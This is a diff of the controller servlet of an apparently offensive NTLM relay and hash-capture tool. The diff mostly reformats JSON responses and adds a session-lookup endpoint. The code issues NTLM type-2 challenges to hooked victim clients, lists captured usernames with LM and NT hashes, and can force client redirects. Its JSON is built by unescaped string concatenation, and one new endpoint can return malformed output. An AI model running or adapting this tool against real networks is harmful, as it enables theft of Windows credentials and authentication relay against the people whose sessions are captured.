@@ -25,12 +25,13 @@ class ControllerServlet < HTTPServlet::AbstractServlet
     }
 
 		path = req.unparsed_uri
-		resp.body = "{ 'status': 'ok' }"
+		resp.body = '{ "status": "ok" }'
 
 		# create a response body based upon the URI path
 		resp.body = listsessions if /^\/controller\/listsessions/io =~ path
 		resp.body = listhashes if /^\/controller\/allhashes/io =~ path or /^\/controller\/allusers/io =~ path
 		resp.body = listuser(req) if /^\/controller\/listuser/io =~ path
+		resp.body = listsession(req) if /^\/controller\/session/io =~ path
 		resp.body = clientredirect(req) if /^\/controller\/redirect/io =~ path
 		resp.body = staticnonce_request(req) if /^\/controller\/static/io =~ path
 		resp.body = type2_request(req) if /^\/controller\/type2/io =~ path
@@ -47,7 +48,7 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		#  Take the Session Key and search for it in the Sessions hash.
 		#  If client exists and has communicated to the controller within
 		#  the configured timeout, add a request in the session database
-		key = req.query['key'] or return "{'status':'no key provided'}"
+		key = req.query['key'] or return '{"status": "no key provided"}'
 		session = Session.find(:first, :conditions => [ "key_id = ?", key])
 		if session != nil then
 			session.function = "static"
@@ -57,17 +58,17 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 			else
 				session.nonce = $config['nonce'].unpack('h*')
 			end
-			response = "{ 'status': 'ok' }"
+			response = '{ "status": "ok" }'
 			begin
 				nonce = session.nonce.unpack('h*')
 			rescue
-				response = "{ 'status': 'bad nonce' }"
+				response = '{ "status": "bad nonce" }'
 			end
 			session.type2_base64 = ""
 			session.save
 		else
 			# invalid!
-			response = "{'status': 'invalid session key'}"
+			response = '{"status": "invalid session key"}'
 		end
 					
 		return response
@@ -84,7 +85,7 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		# be returned to the attacker in JSON format for processing. If all goes
 		# well then authentication succeeds! Dutchie passed!
 		
-		key = req.query['key'] or return "{'status':'no key provided'}"
+		key = req.query['key'] or return '{ "status": "no key provided" }'
 		session = Session.find(:first, :conditions => [ "key_id = ?", key])
 		if session != nil then
 			if req.query['type2'] == nil then
@@ -96,12 +97,12 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 				begin
 					nonce = req.query['nonce'].to_a.pack('h*')
 				rescue
-					return "{ 'status': 'error processing nonce or no nonce provided' }"
+					return '{ "status": "error processing nonce or no nonce provided" }'
 				end
 				begin
 					reqflags = req.query['flags'].to_a.pack('h8')
 				rescue
-					return "{ 'status': 'error processing request flags or no flags provided' }"
+					return '{ "status": "error processing request flags or no flags provided" }'
 				end
 				type2 = Rex::Proto::SMB::Utils.create_type2_message(reqflags, nonce, domain, server, dns_name, dns_domain, downgrade=false)
 			else
@@ -118,13 +119,13 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 				session.save
 
 				# do five cycles to wait for the response from client
-				response = " { 'status': 'no response' }"
+				response = '{ "status": "no response" }'
 				(1..5).each do |loopcicle|
 					sleep($config['timeout']/1000)	# timeout is in milliseconds
 					session = Session.find(:first, :conditions => [ "key_id = ?", key ])
 					if session != nil then
 						if session.result != nil
-							response = " { 'timestamp': '#{session.timestamp}', 'result': '#{session.result}' } "
+							response = '{ "status": "ok", "timestamp": "' + session.timestamp + '", "result": "' + session.result + '" }'
 							break
 						end
 					else
@@ -134,7 +135,7 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 				end # cycles
 			end # if decode
 		else
-			response = "{'status': 'no session found'}"
+			response = '{"status": "no session found"}'
 		end
 		
 		return response
@@ -142,22 +143,22 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		
 	# list all sessions, latest first.
 	def listsessions
-		response = "{ 'status': 'ok', 'sessions': "
+		response = '{ "status": "ok", "sessions": '
 		sessions = Session.find(:all, :order => "timestamp DESC")
 		sessions.each { |s|
-			response = response + "{ 'key': '#{s.key_id}', "+
-			  "'timestamp': '#{s.timestamp}', " +
-			  "'function': '#{s.function}', " +
-				"'url': '#{s.url}', " +
-				"'nonce': '#{s.nonce}', " +
-				"'type2': '#{s.type2_base64}', " +
-				"'domain': '#{s.domain}', " +
-				"'server': '#{s.server}', " +
-				"'dns_name': '#{s.dns_name}', " +
-				"'dns_domain': '#{s.dns_domain}', " +
-				"'result': '#{s.result}' }\n"
+			response = response + '{ "key": "' + s.key_id + '", ' +
+			  '"timestamp": "' + s.timestamp + '", ' +
+			  '"function": "' + s.function + '", ' +
+				'"url": "' + s.url + '", ' +
+				'"nonce": "' + s.nonce + '", ' +
+				'"type2": "' + s.type2_base64 + '", ' +
+				'"domain": "' + s.domain + '", ' +
+				'"server": "' + s.server + '", ' +
+				'"dns_name": "' + s.dns_name + '", ' +
+				'"dns_domain": "' + s.dns_domain + '", ' +
+				'"result": "' + s.result + '" }' + "\n"
 		}
-		response = response + " }\n"
+		response = response + " }"
 		#print "response: #{response}"
 		
 		return response
@@ -165,17 +166,17 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 
 	# list all users and their hashes
 	def listhashes
-		response = "{ 'status': 'ok', 'hashes': "
+		response = '{ "status": "ok", "hashes": '
 		users = User.find(:all, :order => "timestamp DESC")
 		users.each { |u|
-			response = response + "{ 'key': '#{u.key}', " +
-			  "'timestamp': '#{u.timestamp}', " +
-				"'user': '#{u.user}', " +
-				"'workstation': '#{u.workstation}', " +
-				"'domain': '#{u.domain}', " +
-				"'nonce': '#{u.nonce}', " +
-				"'lm': '#{u.lm}', " +
-				"'nt': '#{u.nt}' }\n"
+			response = response + '{ "key": "' + u.key + '", ' +
+			  '"timestamp": "' + u.timestamp + '", ' +
+				'"user": "' + u.user + '", ' +
+				'"workstation": "' + u.workstation + '", ' +
+				'"domain": "' + u.domain + '", ' +
+				'"nonce": "' + u.nonce + '", ' +
+				'"lm": "' + u.lm + '", ' +
+				'"nt": "' + u.nt + '" }' + "\n"
 			}
 		response = response + " }\n"
 		#print "response: #{response}"
@@ -185,21 +186,21 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 
 	# list a specific username's hashes
 	def listuser(req)
-		user = req.query['user'] or return "{ 'status': 'no user specified' }"
-		response = "{ 'status': 'ok', 'hashes': "
+		user = req.query['user'] or return '{ "status": "no user specified" }'
+		response = '{ "status": "ok", "hashes": '
 		users = User.find(:all, :order => "timestamp DESC", :conditions => ["upper(user) = ?", user.upcase ] )
 		if users == nil then
-			response = "{ 'status': 'user not found' }"
+			response = '{ "status": "user not found" }'
 		else
 			users.each { |u|
-				response = response + "{ 'key': '#{u.key}', " +
-				  "'timestamp': '#{u.timestamp}', " +
-					"'user': '#{u.user}', " +
-					"'workstation': '#{u.workstation}', " +
-					"'domain': '#{u.domain}', " +
-					"'nonce': '#{u.nonce}', " +
-					"'lm': '#{u.lm}', " +
-					"'nt': '#{u.nt}' }\n"
+				response = response + '{ "key": "' + u.key + '", ' +
+				  '"timestamp": "' + u.timestamp + '", ' +
+					'"user": "' + u.user + '", ' +
+					'"workstation": "' + u.workstation + '", ' +
+					'"domain": "' + u.domain + '", ' +
+					'"nonce": "' + u.nonce + '", ' +
+					'"lm": "' + u.lm + '", ' +
+					'"nt": "' + u.nt + '" }' + "\n"
 			}
 			response = response + " }\n"
 		end
@@ -208,9 +209,30 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		return response
 	end
 	
+	# list a specific session key
+	def listsession(req)
+		key = req.query['key'] or return '{ "status": "no key specified" }'
+		response = '{ "status": "ok", "hashes": '
+		s = Session.find(:first, :conditions => [ "key_id = ?", key])
+		if s != nil then
+			response = response + '{ "key": "' + s.key_id + '", ' +
+			  '"function": "' + s.function + '", ' +
+			  '"url": "' + s.url + '", ' +
+			  '"nonce": "' + s.nonce + '", ' +
+			  '"type2": "' + s.type2_base64 + '", ' +
+			  '"domain": "' + s.domain + '", ' +
+			  '"server": "' + s.server + '", ' +
+			  '"dns_name": "' + s.dns_name + '", ' +
+			  '"dns_domain": "' + s.dns_domain + '", ' +
+			  '"result": "' + s.result + '" } }' + "\n"
+		end
+		
+		return response
+	end
+
 	# clear a session
 	def clearsession(req)
-		key = req.query['key'] or return "{ 'status': 'no session key specified' }"
+		key = req.query['key'] or return '{ "status": "no session key specified" }'
 		session = Session.find(:first, :conditions => [ "key_id = ?", key])
 		if session != nil then
 			session.function = ""
@@ -223,9 +245,9 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 			session.dns_domain = ""
 			session.result = ""
 			session.save
-			response = "{'status': 'ok'}"
+			response = '{"status": "ok"}'
 		else
-			response = "{'status': 'invalid session key'}"
+			response = '{"status": "invalid session key"}'
 		end
 		
 		return response
@@ -233,16 +255,16 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 	
 	# force client redirection
 	def clientredirect(req)
-		key = req.query['key'] or return "{'status':'no key provided'}"
-		url = req.query['url'] or return "{'status':'no url provided'}"
-		response = "{ 'status': 'ok' }"
+		key = req.query['key'] or return '{"status": "no key provided"}'
+		url = req.query['url'] or return '{"status": "no url provided"}'
+		response = '{ "status": "ok" }'
 		session = Session.find(:first, :conditions => [ "key_id = ?", key])
 		if session != nil then
 			session.function = "redir"
 			session.url = req.query['url']
 			session.save
 		else
-			response = "{ 'status': 'no session found'}"
+			response = '{ "status": "no session found" }'
 		end
 		
 		return response
